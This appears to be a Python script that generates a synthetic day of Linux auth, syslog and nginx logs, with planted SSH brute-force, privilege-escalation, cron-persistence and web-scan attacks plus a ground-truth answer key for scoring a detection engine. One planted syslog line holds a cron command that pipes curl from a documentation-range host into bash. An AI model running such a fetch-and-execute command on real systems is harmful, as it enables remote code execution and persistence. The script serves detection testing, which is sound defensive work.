#!/usr/bin/env python3
"""
Generate a realistic, production-style day of Linux telemetry for the detection
engine to analyze — the kind of logs you'd pull off an internet-facing server.

It mixes:
  * BENIGN baseline   — legitimate key-based logins + normal web traffic (200s)
  * INTERNET NOISE    — the constant low-level scanning every public host sees
                        (isolated failed logins from many IPs; 404s here and there)
  * EMBEDDED ATTACKS  — real brute-force campaigns, a compromise, privilege
                        escalation, persistence, and a web path scan

The whole point: the attacks are HIDDEN in the noise. A good detector must find
them without alerting on the benign baseline (false positives). The generator
knows exactly what it planted (the "ground truth"), so detection can be scored.

Ethics: every IP is from an RFC 5737 range reserved for documentation
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) — no real host is implicated.

    python3 generate_dataset.py            # writes engine/logs/ + ground_truth.json
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(1337)  # reproducible dataset

BASE = Path(__file__).resolve().parent.parent
LOGS = BASE / "engine" / "logs"
DAY = datetime(2026, 10, 18, 0, 0, 0, tzinfo=timezone.utc)

# RFC 5737 documentation ranges only.
def doc_ip(third=None, fourth=None):
    net = random.choice([192, 198, 203])
    second = {192: 0, 198: 51, 203: 0}[net]
    third = {192: 2, 198: 100, 203: 113}[net] if third is None else third
    return f"{net}.{second}.{third}.{fourth if fourth else random.randint(2, 254)}"

OFFICE_IPS = ["198.51.100.10", "198.51.100.11"]        # CI/deploy + admin workstation
BF_ROOT_IP = "203.0.113.42"                             # brute-force campaign (root), fails
BF_WIN_IP  = "203.0.113.77"                             # brute-force campaign, succeeds
SCAN_IP    = "203.0.113.133"                            # web path scanner

BOT_USERS = ["root", "admin", "oracle", "postgres", "ubuntu", "test", "git",
             "ftp", "user", "pi", "administrator", "support", "guest", "www-data"]
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/16.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]
NORMAL_PATHS = ["/", "/index.html", "/about", "/contact", "/css/site.css",
                "/js/app.js", "/img/logo.png", "/favicon.ico", "/products", "/blog"]
SCAN_PATHS = ["/admin", "/wp-admin", "/.env", "/.git/config", "/config.php",
              "/backup.zip", "/phpinfo.php", "/shell.php", "/old", "/test.php",
              "/server-status", "/.aws/credentials", "/wp-login.php", "/api/v1/users"]

auth: list[tuple[datetime, str]] = []
syslog: list[tuple[datetime, str]] = []
nginx: list[tuple[datetime, str]] = []
pid = iter(range(1000, 99999))

def ts(dt: datetime) -> str:
    return dt.isoformat(timespec="microseconds")

def ngx_ts(dt: datetime) -> str:
    return dt.strftime("[%d/%b/%Y:%H:%M:%S +0000]")

# ---------------------------------------------------------------------------
# 1. BENIGN baseline — legitimate publickey logins through the working day.
for _ in range(14):
    t = DAY + timedelta(hours=random.uniform(8, 18), minutes=random.uniform(0, 59))
    ip = random.choice(OFFICE_IPS)
    user = "deploy" if ip == OFFICE_IPS[0] else "admin"
    p = next(pid)
    auth.append((t, f"{ts(t)} victim sshd[{p}]: Accepted publickey for {user} "
                    f"from {ip} port {random.randint(40000,60000)} ssh2: ED25519 SHA256:abc{p}"))
    auth.append((t + timedelta(milliseconds=3),
                 f"{ts(t+timedelta(milliseconds=3))} victim sshd[{p}]: "
                 f"pam_unix(sshd:session): session opened for user {user}(uid=10{p%9}) by (uid=0)"))

# 2. INTERNET NOISE — isolated failed logins from many IPs (background scanning).
#    Each IP appears only 1-2 times -> BELOW the brute-force threshold -> no alert.
for _ in range(45):
    t = DAY + timedelta(hours=random.uniform(0, 24), seconds=random.uniform(0, 59))
    ip = doc_ip()
    u = random.choice(BOT_USERS)
    p = next(pid)
    auth.append((t, f"{ts(t)} victim sshd[{p}]: Failed password for "
                    f"{'invalid user ' if u not in ('root',) else ''}{u} from {ip} "
                    f"port {random.randint(30000,60000)} ssh2"))

# 3. ATTACK A — brute-force campaign against 'root' from one IP (FAILS). Caught by LAB-001.
t0 = DAY + timedelta(hours=2, minutes=14)
for i in range(22):
    t = t0 + timedelta(seconds=i * 3.5)
    p = next(pid)
    auth.append((t, f"{ts(t)} victim sshd[{p}]: Failed password for root "
                    f"from {BF_ROOT_IP} port {random.randint(30000,60000)} ssh2"))

# 4. ATTACK B — brute force against 'alice' that SUCCEEDS, then privesc + persistence.
t0 = DAY + timedelta(hours=3, minutes=41)
for i in range(16):
    t = t0 + timedelta(seconds=i * 2.2)
    p = next(pid)
    auth.append((t, f"{ts(t)} victim sshd[{p}]: Failed password for alice "
                    f"from {BF_WIN_IP} port {random.randint(30000,60000)} ssh2"))
tc = t0 + timedelta(seconds=16 * 2.2)
pc = next(pid)
auth.append((tc, f"{ts(tc)} victim sshd[{pc}]: Accepted password for alice "
                 f"from {BF_WIN_IP} port 55012 ssh2"))
auth.append((tc + timedelta(seconds=4), f"{ts(tc+timedelta(seconds=4))} victim sudo:    "
             f"alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id"))
auth.append((tc + timedelta(seconds=4.1), f"{ts(tc+timedelta(seconds=4.1))} victim sudo: "
             f"pam_unix(sudo:session): session opened for user root(uid=0) by (uid=1000)"))
syslog.append((tc + timedelta(seconds=9),
               f"{ts(tc+timedelta(seconds=9))} victim crontab[{next(pid)}]: (alice) REPLACE (alice)"))
syslog.append((tc + timedelta(seconds=69),
               f"{ts(tc+timedelta(seconds=69))} victim CRON[{next(pid)}]: (alice) "
               f'CMD (/bin/bash -c "curl -s http://203.0.113.90/b | bash")'))

# 5. BENIGN web traffic — normal visitors browsing (200s), all day.
for _ in range(70):
    t = DAY + timedelta(hours=random.uniform(6, 22), seconds=random.uniform(0, 59))
    ip = doc_ip()
    path = random.choice(NORMAL_PATHS)
    ua = random.choice(BROWSERS)
    code = random.choice([200, 200, 200, 200, 304, 301])
    nginx.append((t, f'{ip} - - {ngx_ts(t)} "GET {path} HTTP/1.1" {code} '
                     f'{random.randint(200,6000)} "-" "{ua}"'))

# 6. INTERNET NOISE (web) — a few scattered 404s from different IPs (below threshold).
for _ in range(9):
    t = DAY + timedelta(hours=random.uniform(0, 24), seconds=random.uniform(0, 59))
    nginx.append((t, f'{doc_ip()} - - {ngx_ts(t)} "GET {random.choice(SCAN_PATHS)} '
                     f'HTTP/1.1" 404 153 "-" "{random.choice(BROWSERS)}"'))

# 7. ATTACK C — web path scan: a burst of 404s from one scanner IP. Caught by LAB-005.
t0 = DAY + timedelta(hours=5, minutes=3)
for i, path in enumerate(SCAN_PATHS):
    t = t0 + timedelta(seconds=i * 1.5)
    nginx.append((t, f'{SCAN_IP} - - {ngx_ts(t)} "GET {path} HTTP/1.1" 404 153 "-" '
                     f'"Mozilla/5.0 (compatible; Nmap Scripting Engine)"'))

# ---------------------------------------------------------------------------
# Write the three log files, each sorted by time (as a real log would be).
LOGS.mkdir(parents=True, exist_ok=True)
for name, rows in [("auth.log", auth), ("syslog", syslog), ("nginx_access.log", nginx)]:
    rows.sort(key=lambda r: r[0])
    (LOGS / name).write_text("\n".join(line for _, line in rows) + "\n", encoding="utf-8")

# Ground truth: what we actually planted, so detection can be scored.
ground_truth = {
    "generated": datetime.now(timezone.utc).isoformat(timespec="seconds"),
    "note": "IPs are RFC 5737 documentation ranges; dataset is synthetic but modeled on real patterns.",
    "benign_ssh_sessions": 14,
    "internet_noise_failed_logins": 45,
    "benign_web_requests": 70,
    "web_noise_404s": 9,
    "attacks": [
        {"id": "A", "type": "SSH brute force (root), failed", "src_ip": BF_ROOT_IP,
         "rule": "LAB-001", "mitre": "T1110.001"},
        {"id": "B1", "type": "SSH brute force (alice), succeeded", "src_ip": BF_WIN_IP,
         "rule": "LAB-001", "mitre": "T1110.001"},
        {"id": "B2", "type": "Valid-account login after brute force", "src_ip": BF_WIN_IP,
         "rule": "LAB-002", "mitre": "T1078"},
        {"id": "B3", "type": "Privilege escalation via sudo", "src_ip": BF_WIN_IP,
         "rule": "LAB-003", "mitre": "T1548.003"},
        {"id": "B4", "type": "Cron persistence installed", "src_ip": BF_WIN_IP,
         "rule": "LAB-004", "mitre": "T1053.003"},
        {"id": "C", "type": "Web path scanning", "src_ip": SCAN_IP,
         "rule": "LAB-005", "mitre": "T1595.003"},
    ],
}
(LOGS / "ground_truth.json").write_text(json.dumps(ground_truth, indent=2))

total = len(auth) + len(syslog) + len(nginx)
print(f"Generated a production-style dataset:")
print(f"  auth.log          {len(auth):>4} lines")
print(f"  syslog            {len(syslog):>4} lines")
print(f"  nginx_access.log  {len(nginx):>4} lines")
print(f"  TOTAL             {total:>4} log lines")
print(f"  Planted attacks   {len(ground_truth['attacks'])} campaigns hidden in the noise")
print(f"  Benign + noise    {14+45+70+9} events that must NOT alert")
print(f"Ground truth -> engine/logs/ground_truth.json")
